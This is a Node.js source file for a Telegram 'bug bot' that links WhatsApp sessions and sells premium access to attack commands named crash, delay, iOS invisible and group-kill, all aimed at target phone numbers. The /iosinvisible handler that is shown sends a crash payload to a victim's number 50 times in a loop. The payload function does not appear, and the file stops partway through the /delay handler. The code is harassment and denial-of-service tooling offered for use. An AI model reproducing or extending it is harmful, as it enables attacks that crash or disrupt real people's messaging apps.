// ⏳ Runtime calculator
function runtime(seconds) {
  seconds = Number(seconds);
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return (
    (d > 0 ? d + "d " : "") +
    (h > 0 ? h + "h " : "") +
    (m > 0 ? m + "m " : "") +
    (s > 0 ? s + "s" : "")
  );
}

// ──────────────── Imports ────────────────
const TelegramBot = require('node-telegram-bot-api');
const {
  makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  proto,

  // ✅ ADD THESE ONLY
  jidDecode,
  encodeWAMessage,
  encodeSignedDeviceIdentity

} = require('@whiskeysockets/baileys');

const fs = require('fs-extra');
const path = require('path');
const P = require('pino');
const chalk = require('chalk');
const dotenv = require('dotenv');
const crypto = require('crypto');
const axios = require('axios');
dotenv.config();

const { BOT_TOKEN, OWNER_ID } = require('./config');
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const SESSIONS_DIR = './sessions';
const SESSIONS_FILE = './sessions/active_sessions.json';
const PAIR_FILE = './user_pairs.json'; // updated file name
const PREMIUM_FILE = './premium_users.json';

const sessions = new Map();
let sock;
let Gyzen;

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

let premiumUsers = [];
let pairedUsers = [];
let userPairs = [];


function cleanupExpiredPremiums() {
  const now = Date.now();
  const before = premiumUsers.length;

  premiumUsers = premiumUsers.filter(u => u.expiresAt > now);

  if (premiumUsers.length !== before) {
    savePremiumUsers();
    console.log(chalk.yellow('🧹 Expired premium users cleaned'));
  }
}

// Run every 60 seconds
setInterval(cleanupExpiredPremiums, 60 * 1000);

// Run once on startup
cleanupExpiredPremiums();

//auto add premium 
function addAutoPremium(userId, durationHours = 24) {
  const now = Date.now();
  const expiresAt = now + durationHours * 60 * 60 * 1000;

  const exists = premiumUsers.find(u => u.id === userId.toString());

  if (exists) {
    // Extend premium
    exists.expiresAt = expiresAt;
  } else {
    premiumUsers.push({
      id: userId.toString(),
      expiresAt
    });
  }

  savePremiumUsers();
}
// ──────────────── Load & Save ────────────────
function loadPremiumUsers() {
  try {
    if (fs.existsSync(PREMIUM_FILE)) {
      premiumUsers = JSON.parse(fs.readFileSync(PREMIUM_FILE));
    }
  } catch (error) {
    console.error('Error loading premium users:', error);
    premiumUsers = [];
  }
}

function savePremiumUsers() {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(premiumUsers, null, 2));
  } catch (error) {
    console.error('Error saving premium users:', error);
  }
}

function loadPairedUsers() {
  try {
    if (fs.existsSync(PAIR_FILE)) {
      userPairs = JSON.parse(fs.readFileSync(PAIR_FILE));
      pairedUsers = userPairs.map(p => p.whatsappNumber);
    }
  } catch (error) { console.error('Error loading paired users:', error); }
}

function savePairedUsers() {
  try { fs.writeFileSync(PAIR_FILE, JSON.stringify(userPairs, null, 2)); }
  catch (error) { console.error('Error saving paired users:', error); }
}

function isPremium(userId) {
  const now = Date.now();
  return premiumUsers.some(
    u => u.id === userId.toString() && u.expiresAt > now
  );
}
function isPaired(userId) { return pairedUsers.includes(userId.toString()); }

// ──────────────── Active Sessions ────────────────
function saveActiveSessions(botNumber) {
  try {
    const sessionsList = fs.existsSync(SESSIONS_FILE) ? JSON.parse(fs.readFileSync(SESSIONS_FILE)) : [];
    if (!sessionsList.includes(botNumber)) sessionsList.push(botNumber);
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList, null, 2));
  } catch (error) { console.error('Error saving session:', error); }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
  return deviceDir;
}

function removeBrokenSession(botNumber) {
  try {
    const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
    console.log(chalk.redBright(`🗑️ Deleted session folder for ${botNumber}`));

    if (fs.existsSync(SESSIONS_FILE)) {
      const list = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const updated = list.filter(num => num !== botNumber);
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updated, null, 2));
      console.log(chalk.yellow(`⚠️ Removed ${botNumber} from active_sessions.json`));
    }

    // Remove from paired users & userPairs
    pairedUsers = pairedUsers.filter(num => num !== botNumber);
    userPairs = userPairs.filter(pair => pair.whatsappNumber !== botNumber);
    savePairedUsers();

  } catch (err) { console.error(chalk.red(`❌ Error deleting broken session for ${botNumber}:`), err); }
}

// ──────────────── User Pair JSON Helpers ────────────────
const USER_PAIRS_FILE = './user_pairs.json';

// Load paired users on startup
function loadUserPairs() {
  try {
    if (fs.existsSync(USER_PAIRS_FILE)) {
      userPairs = JSON.parse(fs.readFileSync(USER_PAIRS_FILE));
    }
  } catch (err) {
    console.error("Error loading user pairs:", err);
  }
}

// Save paired users
function saveUserPairs() {
  try {
    fs.writeFileSync(USER_PAIRS_FILE, JSON.stringify(userPairs, null, 2));
  } catch (err) {
    console.error("Error saving user pairs:", err);
  }
}

// Get paired number for a Telegram user
function getPairedNumber(telegramId) {
  const entry = userPairs.find(u => u.telegramId === telegramId);
  return entry ? entry.whatsappNumber : null;
}

// Add or update a pairing
function setUserPair(telegramId, whatsappNumber) {
  const index = userPairs.findIndex(u => u.telegramId === telegramId);
  if (index !== -1) {
    userPairs[index].whatsappNumber = whatsappNumber;
  } else {
    userPairs.push({ telegramId, whatsappNumber });
  }
  saveUserPairs();
}

// Remove a pairing
function removeUserPair(telegramId) {
  userPairs = userPairs.filter(u => u.telegramId !== telegramId);
  saveUserPairs();
}



// ──────────────── WhatsApp Connections ────────────────
async function initializeWhatsAppConnections() {
  try {
    if (!fs.existsSync(SESSIONS_FILE)) return;
    const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    console.log(chalk.yellow(`Found ${activeNumbers.length} active WhatsApp sessions`));

    for (const botNumber of activeNumbers) {
      console.log(chalk.blue(`Attempting to connect WhatsApp: ${botNumber}`));
      const sessionDir = createSessionDir(botNumber);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
      const version = [2, 3000, 1026924051];

      Gyzen = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        logger: P({ level: 'silent' }),
        version,
        defaultQueryTimeoutMs: undefined,
      });

      sock = Gyzen;

      Gyzen.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
          console.log(chalk.green(`Bot ${botNumber} Connected 🔥!`));
          sessions.set(botNumber, Gyzen);
          if (!pairedUsers.includes(botNumber)) {
            pairedUsers.push(botNumber);
            savePairedUsers();
          }
        } else if (connection === 'close') {
          const statusCode = lastDisconnect?.error?.output?.statusCode || 0;
          console.log(chalk.red(`⚠️ Connection closed for ${botNumber} [${statusCode}]`));
          if (statusCode === DisconnectReason.loggedOut || statusCode === DisconnectReason.connectionClosed || statusCode === 403 || !Gyzen.ws || Gyzen.ws.readyState !== 1) {
            console.log(chalk.redBright(`💀 ${botNumber} appears banned or invalid — cleaning up...`));
            removeBrokenSession(botNumber);
            return;
          }
          console.log(chalk.yellow(`⚠️ Temporary network issue for ${botNumber}, reconnecting...`));
          await sleep(4000);
          await initializeWhatsAppConnections();
        } else if (connection === 'open' && (!Gyzen.ws || Gyzen.ws.readyState !== 1)) {
          console.log(chalk.redBright(`🚫 Fake connected state detected for ${botNumber}`));
          removeBrokenSession(botNumber);
        }
      });

      Gyzen.ev.on('creds.update', saveCreds);
    }
  } catch (error) { console.error(chalk.red('Error initializing WhatsApp connections:'), error); }
}

// ──────────────── Connect to WhatsApp ────────────────
async function connectToWhatsApp(botNumber, chatId) {
  try {
    let statusMessage = await bot.sendMessage(chatId, `PROCESSING PAIRING ${botNumber}...`).then((msg) => msg.message_id);
    const sessionDir = createSessionDir(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const version = [2, 3000, 1026924051];

    Gyzen = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: P({ level: 'silent' }),
      version,
      defaultQueryTimeoutMs: undefined,
    });
    sock = Gyzen;

    Gyzen.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === 'close') {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        if (statusCode && statusCode >= 500 && statusCode < 600) {
          await bot.editMessageText(`PROCESSING ${botNumber}...`, { chat_id: chatId, message_id: statusMessage });
          await connectToWhatsApp(botNumber, chatId);
        } else {
          await bot.editMessageText(`ERROR ${botNumber}...`, { chat_id: chatId, message_id: statusMessage });
          try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch {}
        }
      } else if (connection === 'open') {
        sessions.set(botNumber, Gyzen);
        saveActiveSessions(botNumber);
        if (!pairedUsers.includes(botNumber)) { pairedUsers.push(botNumber); savePairedUsers(); }
        await bot.editMessageText(`Pairing Success ${botNumber}...`, { chat_id: chatId, message_id: statusMessage });
      } else if (connection === 'connecting') {
        await sleep(1000);
        try {
          if (!fs.existsSync(`${sessionDir}/creds.json`)) {
            const code = await Gyzen.requestPairingCode(botNumber);
            const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
            await bot.editMessageText(`SUCCESS PAIRING\nCODE: ${formattedCode}`, { chat_id: chatId, message_id: statusMessage });
          }
        } catch { await bot.editMessageText(`FAILED ${botNumber}...`, { chat_id: chatId, message_id: statusMessage }); }
      }
    });

    Gyzen.ev.on('creds.update', saveCreds);
    return Gyzen;

  } catch (error) { console.error('Error in connectToWhatsApp:', error); await bot.sendMessage(chatId, 'Error connecting to WhatsApp.'); }
}

// Bot Start
// CONFIG — update apne links aur channel username
const CHANNEL_USERNAME = "@syedotp"; // Telegram channel
const YT_LINK = "http://www.youtube.com/@Teamsyedhaker";
const IG_LINK = "https://www.instagram.com/syeddlrofficial?igsh=MXBuZnU0bGVma3UwMQ==";
const WA_LINK = "https://whatsapp.com/channel/0029VbBo79xA89MqhJETWp0Z";

// Join check helper
async function isUserJoined(bot, userId) {
  try {
    const member = await bot.getChatMember(CHANNEL_USERNAME, userId);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (e) {
    return false;
  }
}

// AUTO  Mera FUNCTION
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  addAutoPremium(chatId, 9999);

  const joined = await isUserJoined(bot, userId);

  // ❌ NOT JOINED
  if (!joined) {
    return bot.sendMessage(
      chatId,
      "<b>❌ Access Denied</b>\n\nPlease join our channel first to use the bot 👇",
      {
        parse_mode: "HTML", // Markdown se HTML kar diya
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Telegram Channel", url: `https://t.me/${CHANNEL_USERNAME.replace("@","")}` }],
            [
              { text: "▶️ YouTube", url: YT_LINK },
              { text: "📸 Instagram", url: IG_LINK }
            ],
            [{ text: "💬 WhatsApp", url: WA_LINK }],
            [{ text: "✅ Check Again", callback_data: "check_join" }]
          ]
        }
      }
    );
  }

  // ✅ JOINED → AUTO PREMIUM 999 HOURS
  

  const uptime = runtime(process.uptime());

  // HTML use karne se underscores (@syed_hacker_official) error nahi denge
  const introMessage = `
┌───[ ⚡ SYED BUG BOT  ]───┐
│ 𝐃𝐞𝐯: @syed_hacker_official
│ 𝐔𝐩𝐭: ${uptime}
├──────────────────────┤
│ 🤖 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐙𝐎𝐍𝐄
│ • /crashinvi 92xxx
│ • /crashandro num hours
│ • /delay 92xxx
│ • /delay1 92xxx
│ • /delay2 92xxx
│ • /delay3 num hours
├──────────────────────┤
│ 🍎 𝐢𝐎𝐒 𝐙𝐎𝐍𝐄
│ • /xiosinfinity num hours
│ • /iosinvisible 92xxx
├──────────────────────┤
│ 👥 𝐆𝐑𝐎𝐔𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
│ • /getjid
│ • /grupkill
├──────────────────────┤
│ 👑 𝗨𝗦𝗘𝗥𝗦 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
│ • /reqpair
│ • /delpair
└──────────────────────┘
`;

  await bot.sendPhoto(
    chatId,
    "https://files.catbox.moe/z2l1as.jpg",
    {
      caption: introMessage,
      parse_mode: "HTML", // Yahan bhi HTML kar diya taaki error na aaye
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📢 Telegram", url: `https://t.me/${CHANNEL_USERNAME.replace("@","")}` },
            { text: "▶️ YouTube", url: YT_LINK }
          ],
          [
            { text: "📸 Instagram", url: IG_LINK },
            { text: "💬 WhatsApp", url: WA_LINK }
          ]
        ]
      }
    }
  );
});

// CHECK AGAIN BUTTON
bot.on("callback_query", async (q) => {
  if (q.data !== "check_join") return;

  const joined = await isUserJoined(bot, q.from.id);

  if (joined) {
    bot.answerCallbackQuery(q.id, { text: "✅ Verified! Send /start again" });
  } else {
    bot.answerCallbackQuery(q.id, { text: "❌ Still not joined", show_alert: true });
  }
});

// Load users on startup
loadPremiumUsers();
loadPairedUsers();
loadUserPairs();




// ──────────────── Helper to check Main Owner ────────────────
function isMainOwner(userId) {
  return userId === OWNER_ID.toString();
}

//Broadcast 
const USERS_FILE = './users.json'; // users.json path

// Load users from file
let users = [];
function loadUsers() {
  try {
    if (fs.existsSync(USERS_FILE)) {
      users = JSON.parse(fs.readFileSync(USERS_FILE)); // array of IDs
      console.log(`📥 Loaded ${users.length} users from users.json`);
    }
  } catch (err) {
    console.error("❌ Error loading users:", err);
    users = [];
  }
}

// Call on startup
loadUsers();

// Owner-only broadcast command
const ADMIN_ID = "8488081516"; // Only this admin can broadcast

bot.onText(/\/broadcast/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  if (userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Only the ADMIN can use this command!");
  }

  await bot.sendMessage(chatId, "📤 Send me the message you want to broadcast:");

  // Safe listener that only triggers for the admin
  const textListener = async (replyMsg) => {
    if (replyMsg.from.id.toString() !== ADMIN_ID) return; // Ignore everyone else

    bot.removeListener("message", textListener); // Remove listener after one message

    const broadcastText = replyMsg.text || "";

    let sentCount = 0;
    for (const telegramId of users) {
      try {
        await bot.sendMessage(telegramId, broadcastText);
        sentCount++;
      } catch (e) {
        console.error(`❌ Error sending to ${telegramId}:`, e.message);
      }
    }

    bot.sendMessage(chatId, `✅ Broadcast sent to ${sentCount} users!`);
  };

  bot.on("message", textListener);
});
//End Broadcast 
// ──────────────── /listprem ────────────────
bot.onText(/\/listprem$/, async (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.id.toString();

  // ─── ONLY MAIN OWNER ───
  if (!isMainOwner(sender)) {
    return bot.sendMessage(
      chatId,
      "❌ *Only Developer SYED BUG BOT  can use this command!*",
      { parse_mode: "Markdown" }
    );
  }

  // ─── NO PREMIUM USERS ───
  if (!premiumUsers || premiumUsers.length === 0) {
    return bot.sendMessage(
      chatId,
      `╔══════════════════════╗
║   🚀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑𝐒   ║
╠══════════════════════╣
║ ⚠️ No premium users found
╚══════════════════════╝
      `.trim(),
      { parse_mode: "Markdown" }
    );
  }

  const now = Date.now();

  // ─── BUILD LIST ───
  let list = premiumUsers
    .filter(u => u.expiresAt > now)
    .map((u, i) => {
      const remainingSeconds = Math.floor((u.expiresAt - now) / 1000);
      return `│ ${i + 1}. \`${u.id}\` → *${runtime(remainingSeconds)} remaining*`;
    })
    .join("\n");

  // ─── SEND RESULT ───
  return bot.sendMessage(
    chatId,
    `
╔══════════════════════╗
║   🚀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑𝐒   ║
╠══════════════════════╣
║ ${list}
╚══════════════════════╝
    `.trim(),
    { parse_mode: "Markdown" }
  );
});


// ──────────────── Delete Bot Number Command (NO RESTART) ────────────────
bot.onText(/\/delpair(?:\s*(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id.toString();
    const rawNumber = match[1] ? match[1].trim() : null;

    const SESSIONS_FILE = './sessions/active_sessions.json';
    const PAIR_FILE = './user_pairs.json';

    const bannerImage = "https://files.catbox.moe/z2l1as.jpg";

    const sendWithBanner = async (text) => {
        await bot.sendPhoto(chatId, bannerImage, {
            caption: text,
            parse_mode: "Markdown"
        });
    };

    // Premium check
    if (!isPremium(telegramId)) {
        return sendWithBanner(
`╔══════❖ Delete Bot ❖══════╗
║ Command: /delpair
╚═════════════════════════╝`
        );
    }

    // No number provided
    if (!rawNumber) {
        return sendWithBanner(
`╔═══❖ Delete Bot ❖═══╗
║ ⚠️ Provide number in
║    International format
║    /delpair 92xxxxxxx
╚════════════════════╝`
        );
    }

    // Normalize number
    const botNumber = rawNumber.replace(/\D/g, "");

    if (!botNumber || botNumber.length < 10) {
        return sendWithBanner(
`╔═══❖ Wrong Format! ❖═══╗
║ ⚠️ Enter a valid number
║    Example: /delpair 92xxxxxxx
╚═══════════════════════╝`
        );
    }

    // Load JSONs safely
    let activeSessions = {};
    let userPairs = [];

    try {
        activeSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    } catch {
        activeSessions = {};
    }

    try {
        userPairs = JSON.parse(fs.readFileSync(PAIR_FILE));
    } catch {
        userPairs = [];
    }

    // Check if number exists anywhere
    const existsInSessions = activeSessions[botNumber];
    const existsInPairs = userPairs.find(u => u.whatsappNumber === botNumber);

    if (!existsInSessions && !existsInPairs) {
        return sendWithBanner(
`╔═══❖ Not Found ❖═══╗
║ ⚠️ Number ${botNumber}
║    is not paired or active
╚════════════════════╝`
        );
    }

    // Delete from active sessions
    if (existsInSessions) {
        delete activeSessions[botNumber];
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(activeSessions, null, 2));
    }

    // Delete from user pairs
    if (existsInPairs) {
        userPairs = userPairs.filter(u => u.whatsappNumber !== botNumber);
        fs.writeFileSync(PAIR_FILE, JSON.stringify(userPairs, null, 2));
    }

    // SUCCESS (NO RESTART)
    return sendWithBanner(
`╭─❖ Deleted Successfully ❖─╮
│ ✔ ${botNumber}
│   Removed from system
╰─────────────────────────╯`
    );
});




//Restart Handler
bot.onText(/\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  // 1️⃣ Premium check
  if (!isPremium(userId)) {
    return bot.sendMessage(chatId, "🚫 You are not a premium user to use /restart command!");
  }

  // 2️⃣ Check if user has paired number
  const userPaired = userPairs.filter(u => u.telegramId === userId);

  if (userPaired.length === 0) {
    return bot.sendMessage(chatId, "❌ You have not paired any number. Pair first using /reqpair");
  }

  await bot.sendMessage(chatId, "♻️ Checking sessions... please wait.");

  // Load active sessions
  const sessionsFile = './sessions/active_sessions.json';
  let activeSessions = [];

  if (fs.existsSync(sessionsFile)) {
    try {
      activeSessions = JSON.parse(fs.readFileSync(sessionsFile));
    } catch {
      activeSessions = [];
    }
  }

  let removed = 0;
  const updatedActive = [];

  for (const num of activeSessions) {
    const sessionDir = `./sessions/device${num}`;
    const creds = `${sessionDir}/creds.json`;

    const valid =
      fs.existsSync(sessionDir) &&
      fs.existsSync(creds) &&
      fs.readdirSync(sessionDir).length > 0;

    // ❌ Ghost session → remove
    if (!valid) {
      console.log(chalk.redBright(`🗑 Removing ghost session: ${num}`));

      try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch {}

      pairedUsers = pairedUsers.filter(n => n !== num);
      savePairedUsers();

      userPairs = userPairs.filter(u => u.whatsappNumber !== num);
      fs.writeFileSync('./user_pairs.json', JSON.stringify(userPairs, null, 2));

      removed++;
    } else {
      updatedActive.push(num);
    }
  }

  // Save updated sessions if any
  if (updatedActive.length > 0) {
    fs.writeFileSync(sessionsFile, JSON.stringify(updatedActive, null, 2));
  } else {
    if (fs.existsSync(sessionsFile)) {
      fs.rmSync(sessionsFile, { force: true });
    }
  }

  // 3️⃣ CASE A — NO ghost sessions found → DO NOT RESTART
  if (removed === 0) {
    return bot.sendMessage(
      chatId,
      "✅ All sessions are valid. No numbers found.\n✔ No restart needed."
    );
  }

  // 4️⃣ CASE B — Cleanup happened → Restart safely
  await bot.sendMessage(
    chatId,
    `🧹 Removed ${removed} invalid session(s).\n🔄 Restarting bot...`
  );

  setTimeout(() => {
    console.log(chalk.yellowBright("🔁 Restarting process after cleanup..."));
    process.exit(0); // safe restart ONLY if cleanup happened
  }, 3000);
});



// ──────────────── Helper to check Main Owner ────────────────
function isMainOwner(userId) {
  return userId === OWNER_ID.toString();
}

// ──────────────── Add Premium User (Days Based) ────────────────
bot.onText(/\/addprem(?:\s+(\d+))?(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = match[1];
  const days = match[2];
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: 'Markdown'
    });
  };

  // 🔒 Only Main Owner
  if (!isMainOwner(msg.from.id.toString())) {
    return sendWithBanner("🚫 Only Developer SYED BUG BOT can use this command!");
  }

  if (!userId || !days) {
    return sendWithBanner(`
┌─❖ *Add Premium (Days)* ❖┐
│                         
│  Usage:                
│  /addprem <id> <days>  
│                         
│  Example:              
│  /addprem 7373737 3    
│                         
└──────────────┬─────────┘
                │
*POWERED BY SYED BUG BOT*
`);
  }

  if (!/^\d+$/.test(userId) || !/^\d+$/.test(days)) {
    return sendWithBanner(`
┌─❖ *Invalid Input* ❖┐
│                     
│  ID & days must be  
│  numeric values     
│                     
└──────────────┬─────┘
                │
*POWERED BY SYED BUG BOT*
`);
  }

  const durationMs = Number(days) * 24 * 60 * 60 * 1000;
  const expiresAt = Date.now() + durationMs;

  // Remove old entry if exists
  premiumUsers = premiumUsers.filter(u => u.id !== userId);

  premiumUsers.push({
    id: userId,
    expiresAt
  });

  savePremiumUsers();

  return sendWithBanner(`
┌─❖ *Premium Added* ❖┐
│                    
│  User ID: ${userId}
│  Duration: ${days} day(s)
│                    
│  Expires in:
│  ${runtime(durationMs / 1000)}
│                    
└──────────────┬─────┘
                │
*POWERED BY SYED BUG BOT*
`);
});


// ──────────────── Delete Premium User Command ────────────────
bot.onText(/\/delprem(?:\s*(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = match[1] ? match[1].trim() : null;
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: 'Markdown' });
  };

  // 🔒 Only Main Owner
  if (!isMainOwner(msg.from.id.toString())) {
    return sendWithBanner("🚫 Only Developer SYED BUG BOT can use this command!");
  }

  if (!userId) {
    return sendWithBanner(`
┌─❖ *Remove Premium User* ❖┐
│                           
│  Please provide a         
│  valid user ID            
│  (e.g., /delprem 1234567890)           
│               
│                           
└──────────────┬───────────┘
                │
*POWERED BY SYED BUG BOT*
    `);
  }

  if (!userId.match(/^\d+$/)) {
    return sendWithBanner(`
┌─❖ *Invalid User ID* ❖┐
│                       
│  Please provide a     
│  valid numeric user   
│  ID (e.g., 1234567890)
│                       
└──────────────┬───────┘
                │
*POWERED BY SYED BUG BOT*
    `);
  }

  if (!premiumUsers.includes(userId)) {
    return sendWithBanner(`
┌─❖ *User Not Premium* ❖┐
│                        
│  User ID ${userId} is     
│  not a premium user.    
│                        
└──────────────┬─────────┘
                │
*POWERED BY SYED BUG BOT*
    `);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  savePremiumUsers();

  return sendWithBanner(`
┌─❖ *Premium User Removed* ❖┐
│                            
│  User ID ${userId} has      
│  been removed from         
│  premium users!            
│                            
└──────────────┬─────────────┘
                │
*POWERED BY SYED BUG BOT*
  `);
});



// ──────────────── Request Pairing Command (UNLIMITED PAIRING + 3 SEC GLOBAL PAUSE) ────────────────
bot.onText(/\/reqpair(?:\s*(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from.id.toString();
  const botNumberRaw = match[1] ? match[1].trim() : null;

  // Premium check
  if (!isPremium(telegramId)) {
    return bot.sendMessage(chatId, "🚫 You are not a premium user to use /reqpair!");
  }

  // Must provide a number
  if (!botNumberRaw) {
    return bot.sendMessage(
      chatId,
      "┌─❖ *Request Pairing* ❖─┐\n" +
      "│ Please provide a number\n" +
      "│ in International format\n" +
      "│ /reqpair 92xxx\n" +
      "└──────────────┬────────┘\n" +
      "                │\n" +
      "*POWERED BY SYED BUG BOT*",
      { parse_mode: "Markdown" }
    );
  }

  // Normalize → digits only
  const botNumber = botNumberRaw.replace(/\D/g, "");
  if (!botNumber) {
    return bot.sendMessage(chatId, "❌ Invalid number.");
  }

  try {
    // --- Connect to WhatsApp and generate pairing code immediately ---
    const socket = await connectToWhatsApp(botNumber, chatId);

    if (!socket) {
      return bot.sendMessage(
        chatId,
        "┌─❖ *Connection Error* ❖─┐\n" +
        "│ WhatsApp pairing failed.\n" +
        "└──────────────┬──────────┘\n" +
        "                │\n" +
        "*POWERED BY SYED BUG BOT*",
        { parse_mode: "Markdown" }
      );
    }

    // --- GLOBAL PAUSE 3 SECONDS ---
    console.log("⏳ Pausing all bot processes for 3 seconds...");
    await new Promise(resolve => setTimeout(resolve, 3500));
    console.log("▶️ Resuming bot processes after pause.");

    // --- Continue normal pairing updates ---
    const existing = userPairs.find(p => p.telegramId === telegramId);
    if (existing) {
      existing.whatsappNumber = botNumber;
    } else {
      userPairs.push({ telegramId, whatsappNumber: botNumber });
    }

    // Update pairedUsers safely
    const normalized = pairedUsers.map(n => n.replace(/\D/g, ""));
    if (!normalized.includes(botNumber)) {
      pairedUsers.push(botNumber);
    }

    // Save JSON
    fs.writeFileSync("./user_pairs.json", JSON.stringify(userPairs, null, 2));
    savePairedUsers();

    // ❌ No success message, silent finish
    return;

  } catch (err) {
    console.error(err);
    return bot.sendMessage(
      chatId,
      "┌─❖ *Connection Error* ❖─┐\n" +
      "│ WhatsApp pairing failed.\n" +
      "└──────────────┬──────────┘\n" +
      "                │\n" +
      "*POWERED BY SYED BUG BOT*",
      { parse_mode: "Markdown" }
    );
  }
});

// ──────────────── Handler: /iosinvisible ───────────────
bot.onText(/\/iosinvisible(?:\s*(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1] ? match[1].trim() : null;
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. PREMIUM CHECK ───
  if (!isPremium(userId)) {
    return sendWithBanner(`╭─❖ Access Denied ❖─╮
│ 🚫 Not a premium user
│
│ Please contact owner
│ for premium access
╰───────────────────╯`);
  }

  // ─── 2. CHECK IF USER HAS PAIRED ANY NUMBER ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);

  if (!pairedEntry) {
    return sendWithBanner(`╔══❖ NO PAIRED NUMBER ❖══╗
║ 📵 WhatsApp not linked
║
║ No active number found.
║ Pair a number first
║ using /reqpair
╚═══════════════════════╝`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 3. CHECK ACTIVE SESSION FOR PAIRED NUMBER ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ ⚠ Your WhatsApp session
║   is not active.
║
║ 🔄 Please pair again:
║   /reqpair
╚═════════════════════════╝`);
  }

  const sock = sessions.get(pairedNumber);

  // ─── 4. TARGET NUMBER VALIDATION ───
  if (!input) {
    return sendWithBanner(`╭─❖ iOS Invisible ❖─╮
│
│ ⚠ Please provide a
│   valid phone number:
│
│ Example:
│ /iosinvisible 92333xxxxxx
│
╰───────────────╯`);
  }

  if (!input.match(/^\d{10,15}$/)) {
    return sendWithBanner(`┌─❖ Invalid Number ❖─┐
│
│ ❌ Provide a valid
│   international number.
│
│ Example: 923123456789
│
└─────────────┘`);
  }

  const target = `${input}@s.whatsapp.net`;

  // ─── 5. MAIN BUG PROCESS ───
  try {

    await sendWithBanner(`┌─❖ Bug Started ❖─┐
│
│ ✅ iOS Invisible sent to ${input}
│
└─────────────┘`);

    for (let i = 0; i < 50; i++) {
      await iosinVisFC(sock, target);
      await sleep(500);
      await iosinVisFC(sock, target);
      await sleep(500);
            
     
      console.log(chalk.blueBright(`⚡ [${i + 1}/50] Sent to ${target}`));
      await sleep(1000);
    }

    return sendWithBanner(`┌─❖ iOS Invisible Done ❖─┐
│ ✅ Completed for ${input}
└─────────────┘`);

  } catch (err) {
    console.error("Error in /iosinvisible:", err);

    return sendWithBanner(`╭─❖ Something Went Wrong ❖─╮
│
│ ⚠️ Process stopped.
│   Please pair again:
│   /reqpair
│
╰─────────────────────╯`);
  }
});

// ──────────────── Handler: /delay ────────────────
bot.onText(/\/delay(?:\s*(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1] ? match[1].trim() : null;
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. PREMIUM CHECK ───
  if (!isPremium(userId)) {
    return sendWithBanner(`╔═❖ ACCESS DENIED ❖═╗
║
║ ⚠ YOU ARE NOT A PREMIUM USER
║ CONTACT OWNER TO GET ACCESS
║
╚═════════════════════╝`);
  }

